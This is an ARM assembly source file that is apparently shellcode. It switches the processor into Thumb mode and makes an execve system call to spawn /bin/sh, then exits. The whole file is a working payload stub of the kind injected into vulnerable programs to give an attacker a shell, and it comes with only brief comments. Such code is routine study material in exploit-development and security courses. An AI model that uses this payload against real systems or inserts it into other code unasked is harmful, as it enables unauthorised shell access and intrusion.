.text
.global _start
_start:
  @ execve("/bin/sh", 0, 0)
  .code 32
  add r6, pc, #1      @ turn on the least-significant bit of the program counter 
  bx r6               @ Branch and Exchange
  .code 16
  add r0, pc, #12
  sub r2, r2, r2
  mov r1, #0
  mov r7, #11
  swi #0
_exit:
  mov r0, #0
  mov r7, #1
  swi #0              @ exit(0)
.asciz "/bin/sh"
